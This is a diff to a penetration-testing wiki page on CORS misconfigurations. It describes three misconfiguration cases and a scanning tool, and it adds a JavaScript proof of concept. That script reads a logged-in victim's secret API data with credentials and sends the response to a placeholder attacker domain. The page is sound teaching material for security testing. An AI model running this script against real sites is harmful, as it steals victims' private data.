@@ -1,4 +1,4 @@
-# CORS (Cross-Origin Resource Sharing)
+# 🛠️ CORS (Cross-Origin Resource Sharing)
 
 ## Theory
 
@@ -14,9 +14,9 @@ Cross-Origin Resource Sharing (CORS) is a header-based mechanism. It improves se
 
 ### Misconfigurations
 
-The exploitation will depend on the misconfiguration. The next image shows a road that can be followed:
+The exploitation will depend on the misconfiguration. The next image shows a path that can be followed:
 
-![](../../../.gitbook/assets/CORS\_exploitation.png)
+![](../../../.gitbook/assets/CORS.png)
 
 #### Case 1
 
@@ -37,8 +37,6 @@ The configuration below is [impossible](https://developer.mozilla.org/en-US/docs
 * `Access-Control-Allow-Origin: *`
 {% endhint %}
 
-The attack technique is a simple Man-in-the-Middle.
-
 #### Case 2
 
 Misconfiguration:
@@ -53,9 +51,7 @@ According to [James Kettle](https://portswigger.net/research/exploiting-cors-mis
 * Request using the `file:` protocol.
 * Sandboxed cross-origin requests.
 
-The value `null `when the server sends credentials is the worst-case scenario. It means any origin can request credentials without limitation.
-
-The attack technique is a simple Man-in-the-Middle.
+The value `null` when the server sends credentials is the worst-case scenario. It means any origin can request credentials without limitation.
 
 #### Case 3
 
@@ -65,11 +61,15 @@ Misconfiguration:
 * `Access-Control-Allow-Origin` is dynamically generated
 * `Vary: Origin` is absent
 
-In this case, it is a little bit difficult to exploit CORS misconfigurations. Check [James Kettle](https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties)'s explanation for more information.&#x20;
+In this case, it's possible to conduct a client-side poisoning.
+
+Check [James Kettle](https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties)'s explanation for more information.&#x20;
 
 ## Practice
 
-In a pentest mission, exploiting CORS misconfigurations is difficult. The attacks rely on manipulating a victim and finding configuration issues on other domains (which can be out of scope).
+During a penetration test, exploiting CORS misconfigurations is difficult. The attacks may rely on manipulating a victim or even finding configuration issues on other domains (which can be out of scope).
+
+However, it's possible to get a Proof-of-Concept using JavaScript by registring a domain (to abuse a CORS misconfiguration).
 
 ### Tool
 
@@ -86,6 +86,22 @@ It is advised to use the verbose option `-v` to see the tests.
 {% hint style="warning" %}
 It is possible to customize the third parties origins in the file `origins.json`.
 {% endhint %}
+
+### Proof-of-Concept (PoC)
+
+To steal sensitive information, the victim has to be logged in the vulnerable website. From there, if the victim is redirected to the attacker's website (containing the script below), the sensitive information will be retrieved by the attacker.
+
+```javascript
+var req = new XMLHttpRequest(); 
+req.onload = reqListener; 
+req.open('get','https://vulnerable.domain/api/secret-data',true); 
+req.withCredentials = true;
+req.send();
+
+function reqListener() {
+    location='//atttacker.domain/log?response='+this.responseText; 
+};
+```
 
 ## References
 
